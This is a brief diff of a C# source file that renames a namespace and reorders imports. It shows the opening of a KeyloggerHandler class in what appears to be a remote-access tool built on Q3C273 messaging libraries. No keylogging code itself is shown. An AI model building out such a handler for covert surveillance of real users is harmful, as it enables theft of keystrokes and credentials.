@@ -1,8 +1,8 @@
-﻿using Everything.Config;
-using Q3C273.Shared.Messages;
+﻿using Q3C273.Shared.Messages;
 using Q3C273.Shared.Networking;
+using Ton618.Config;
 
-namespace Everything.MessageHandlers
+namespace Ton618.MessageHandlers
 {
     public class KeyloggerHandler : IMessageProcessor
     {
